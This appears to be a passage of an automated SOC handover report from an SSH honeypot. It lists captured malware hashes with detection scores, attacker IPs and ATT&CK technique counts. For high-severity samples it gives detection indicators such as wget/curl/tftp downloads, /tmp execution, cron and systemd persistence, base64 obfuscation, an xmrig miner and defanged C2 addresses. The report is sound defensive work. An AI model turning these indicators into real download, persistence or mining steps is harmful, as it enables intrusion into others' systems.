| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.159[.]128` | US | Censys, Inc. | **100** ⚠️ | 5 |
| `5.129.189[.]56` | RU | Ediniy Operator Svyazi LLC | **100** ⚠️ | 6 |
| `176.32.193[.]16` | AM | Ucom CJSC | **100** ⚠️ | 50 |
| `45.148.10[.]152` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `105.224.44[.]84` | ZA | Telkom Internet Broadband 105 224 | **100** ⚠️ | 0 |
| `109.160.32[.]174` | NL | Global Communication Net Plc | **100** ⚠️ | 29 |
| `14.103.41[.]249` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `116.177.172[.]108` | CN | China United Network Communications Corporation Limited | **100** ⚠️ | 50 |
| `71.76.203[.]71` | US | Charter Communications Inc | **100** ⚠️ | 2 |
| `120.27.109[.]9` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 249 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 217 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 113 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 71 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 65 |

---

## 🔕 False Positive Summary (77 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 20 |
| AbuseIPDB score 1 below threshold 25 | 7 |
| AbuseIPDB score 12 below threshold 25 | 5 |
| AbuseIPDB score 14 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 417 cases |
| Tool 34  | Credential Extractor        | ✅ 3124 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 84 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 218 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 77 filtered (18.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 98 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 206 priority case(s) shown individually · 118 recon entry/entries in table (10 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-05T19:15:08Z_
